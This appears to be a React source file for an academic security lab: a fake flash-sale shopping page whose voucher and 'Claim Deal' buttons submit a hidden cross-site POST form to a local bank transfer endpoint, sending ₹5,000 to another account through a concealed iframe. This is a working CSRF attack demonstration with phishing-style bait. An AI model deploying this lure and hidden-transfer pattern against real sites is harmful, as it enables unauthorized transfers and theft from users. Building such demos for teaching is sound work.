import React, { useState, useRef } from 'react';

export default function App() {
  const [clicked, setClicked] = useState(false);
  const [showToast, setShowToast] = useState(false);
  const formRef = useRef(null);

  // Triggered ONLY when the user clicks the promotional image / deal card
  const handleBannerClick = () => {
    setClicked(true);
    setShowToast(true);

    // Submit the hidden cross-site POST form targeting the banking backend
    if (formRef.current) {
      formRef.current.submit();
    }

    // Auto-hide the feedback toast after 5 seconds
    setTimeout(() => {
      setShowToast(false);
    }, 5000);
  };

  const sampleProducts = [
    { id: 1, title: 'UltraBook Pro 15.6" Retina', icon: '💻', price: '₹54,999', orig: '₹79,999', disc: '31% OFF' },
    { id: 2, title: 'Noise Cancelling Wireless Earbuds', icon: '🎧', price: '₹2,499', orig: '₹6,999', disc: '64% OFF' },
    { id: 3, title: 'AMOLED Fitness Smartwatch', icon: '⌚', price: '₹3,999', orig: '₹9,999', disc: '60% OFF' },
    { id: 4, title: 'Pro Gaming Mechanical Keyboard', icon: '⌨️', price: '₹2,199', orig: '₹4,999', disc: '56% OFF' }
  ];

  return (
    <div>
      {/* Top Banner Strip */}
      <div className="top-strip">
        ⚡ FESTIVAL FLASH SALE IS LIVE! EXTRA ₹5,000 DISCOUNT VOUCHER AVAILABLE TODAY ⚡
      </div>

      {/* Main E-Commerce Header */}
      <header className="nav-header">
        <div className="logo">
          <span className="logo-badge">PORT 4000</span>
          <h1>MegaDeals.in</h1>
        </div>

        <div className="search-bar">
          <input
            type="text"
            className="search-input"
            placeholder="Search electronics, fashion, vouchers..."
            readOnly
          />
        </div>

        <div className="nav-links">
          <span>Categories</span>
          <span>Deals</span>
          <a href="#cart" className="cart-btn" onClick={(e) => e.preventDefault()}>
            🛒 Cart (0)
          </a>
        </div>
      </header>

      {/* Main Container */}
      <div className="container">
        {/* Large Hero Promotional Section */}
        <div className="hero-banner-container">
          <div className="promo-banner">
            <div className="promo-text">
              <span className="tag-exclusive">LIMITED TIME FLASH PROMOTION</span>
              <h2>MEGA SALE – UP TO 80% OFF</h2>
              <p>Exclusive festival reward unlocked for your device. Click the voucher card below to claim.</p>
              <div style={{ fontSize: 13, color: '#ffedd5', display: 'flex', gap: 16 }}>
                <span>&#x2714; Instant Activation</span>
                <span>&#x2714; Zero Minimum Spend</span>
                <span>&#x2714; Verified Partner Merchant</span>
              </div>
            </div>

            {/* ============================================================== */}
            {/* THE PROMOTIONAL IMAGE TRIGGER (VIVA REQUIREMENT) */}
            {/* The user must click this card/image to trigger the CSRF attack  */}
            {/* ============================================================== */}
            <div
              className="promo-click-card"
              onClick={handleBannerClick}
              role="button"
              tabIndex={0}
              title="Click to claim voucher"
            >
              <div className="voucher-graphic">
                🎟️ ₹5,000 OFF
              </div>
              <h3>GIFT VOUCHER</h3>
              <p>Click image to claim your ₹5,000 shopping discount credit</p>
              <div className="claim-tag">
                {clicked ? '&#x2714; VOUCHER CLAIMED!' : '👉 TAP IMAGE TO CLAIM'}
              </div>
            </div>
          </div>
        </div>

        {/* HIDDEN CROSS-SITE POST FORM TARGETING THE BANKING ENDPOINT */}
        {/* Form targets a hidden iframe so the victim remains on the shopping page */}
        <form
          ref={formRef}
          action="http://localhost:5000/api/transfer"
          method="POST"
          target="csrf_hidden_frame"
          style={{ display: 'none' }}
        >
          {/* Unauthorized transfer payload */}
          <input type="hidden" name="toAccount" value="200002" />
          <input type="hidden" name="amount" value="5000" />
          {/* Notice: No valid _csrf token can be supplied by the cross-site attacker! */}
        </form>

        {/* Hidden iframe to receive the response without navigating away */}
        <iframe
          name="csrf_hidden_frame"
          id="csrf_hidden_frame"
          title="CSRF Submission Frame"
          style={{ display: 'none' }}
        />

        {/* Flash Sale Products Grid */}
        <div className="section-heading">
          <span>🔥 Trending Lightning Deals</span>
        </div>

        <div className="deals-grid">
          {sampleProducts.map((p) => (
            <div className="product-card" key={p.id}>
              <div className="product-img-box">{p.icon}</div>
              <div className="product-info">
                <div className="product-title">{p.title}</div>
                <div className="product-pricing">
                  <span className="current-price">{p.price}</span>
                  <span className="original-price">{p.orig}</span>
                  <span className="discount-pill">{p.disc}</span>
                </div>
                <button className="btn-buy" onClick={handleBannerClick}>
                  Claim Deal
                </button>
              </div>
            </div>
          ))}
        </div>

        {/* E-Commerce Toast Feedback */}
        {showToast && (
          <div className="toast-notice">
            <h4 style={{ fontSize: 14, color: '#f97316', marginBottom: 4 }}>
              🎉 Voucher Code Applied!
            </h4>
            <p style={{ fontSize: 13, color: '#cbd5e1' }}>
              Your ₹5,000 promotional voucher discount has been activated on your session.
            </p>
            <div style={{ marginTop: 8, fontSize: 11, color: '#94a3b8' }}>
              (Background cross-site request dispatched to Bank API)
            </div>
          </div>
        )}

        {/* Academic Cyber Security Lab Notice for Viva */}
        <div className="lab-info-footer">
          <strong>Academic Cyber Security Lab Context:</strong><br />
          This e-commerce page simulates an attacker-controlled website hosted on <code>http://localhost:4000</code>.
          When the user clicked the promotional voucher image, a hidden HTML form submitted a 
          <code>POST</code> request to <code>http://localhost:5000/api/transfer</code> attempting to transfer ₹5,000 to Account <code>200002</code>.<br />
          Because the user is already authenticated on the legitimate bank tab, the browser automatically attached their session cookie.
        </div>
      </div>
    </div>
  );
}
